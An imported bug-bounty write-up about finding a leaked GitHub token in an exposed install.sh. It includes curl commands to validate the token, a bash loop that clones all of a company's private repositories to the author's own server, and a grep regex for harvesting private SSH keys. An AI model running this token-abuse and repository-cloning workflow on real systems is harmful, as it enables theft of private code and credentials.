---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-09-06_full-structure-takeover-to-many-brands-of-company.md
original_filename: 2021-09-06_full-structure-takeover-to-many-brands-of-company.md
title: Full structure takeover to many brands of company
category: documents
detected_topics:
- information-disclosure
- command-injection
- otp
- rate-limit
- api-security
tags:
- imported
- documents
- information-disclosure
- command-injection
- otp
- rate-limit
- api-security
language: en
raw_sha256: 2d105a0f768a9a2cbeed23c169417e62c47b85e1271b26dc2756af68e30c01e4
text_sha256: 6f1e0440c6ab0d32720a45c2edcf1f2e0627bfc0c1210166062b01a988a0089d
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# Full structure takeover to many brands of company

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-09-06_full-structure-takeover-to-many-brands-of-company.md
- Source Type: markdown
- Detected Topics: information-disclosure, command-injection, otp, rate-limit, api-security
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `2d105a0f768a9a2cbeed23c169417e62c47b85e1271b26dc2756af68e30c01e4`
- Text SHA256: `6f1e0440c6ab0d32720a45c2edcf1f2e0627bfc0c1210166062b01a988a0089d`


## Content

---
title: "Full structure takeover to many brands of company"
url: "https://u-itachi.medium.com/full-structure-takeover-to-many-brands-of-company-e0ca434890ee"
authors: ["Abdelrahman Khaled"]
bugs: ["Directory listing", "Information disclosure"]
publication_date: "2021-09-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3339
scraped_via: "browseros"
---

# Full structure takeover to many brands of company

Full structure takeover to many brands of company
Abdelrahman Khaled
Follow
3 min read
·
Sep 7, 2021

101

Notic: this private program is hosted on bugcrowd platform and have many brands

While testing this program I made a brute-force directories and found this directory listing http://sub.target.com/scripts

Press enter or click to view image in full size
Directory listing

While analysing this files I have found interested token in [install.sh] file

Press enter or click to view image in full size

This is Github access token, [d42e9078e94930************] , but first I want to verify this token valid or expired , because when developer create this token can choose time to expired it automatically like this ..

Press enter or click to view image in full size
Automatically expire after 30 days
Lets try to verify
https://api.github.com/orgs/<username>/repos?access_token=<token>

You should request like this URL by browser or curl, and then matches the response repositories or it was expired ..

Press enter or click to view image in full size
Access token is valid

Amazing!! I can list private clone repositories, But I can’t report it without make sure that data related to company or not, because maybe this developer just work part-time in company, so I will clone private repositories and analysis it, lets goo

curl https://api.github.com/orgs/<username>/repos?access_token=<token> | grep '\"name\"' | cut -d ":" -f 2 | cut -d '"' -f 2 > privare_repos_name.txt
for repo in $(cat privare_repos_name.txt); do git clone https://<access-token>@github.com/<username>/$repo; done

This bash code to clone all private repositories at my VPS and then go to analysis it

Press enter or click to view image in full size
5.4G size of all repositories

I have found 5.4G size of repositories OMG..

5.4G !!!!!!

I can’t analysis this size of data in short time, so I will use grep command to get sensitive data

# Grep private ssh key command
grep -r -R '(?=[-]*(?=[A-Z]*(?=[-])))(.*)(?=[-]*(?=[A-Z]*(?=[-])))'
Press enter or click to view image in full size

This regex to extract private ssh key from all repositories , very nice

Press enter or click to view image in full size
docker-compose.yml creds

This file I have found many of creds and I have found many of docker connections but I cant make this because its out of scope from program, because the program say that not to try connect databases or internal structure

Get Abdelrahman Khaled’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

But I have larger than 15 private repository related to 15 brand :)

I found at every repo [ panel passwords , backup databases , full application code , cloud creds] and I can connect and takeover all brands

Also Business impact

I reached to all [product architecture , products layout] but sorry I cant share this, to preserve the confidentiality of company data

Keep following

Linkedin | Facebook

I will publish some juicy writeups soon ..
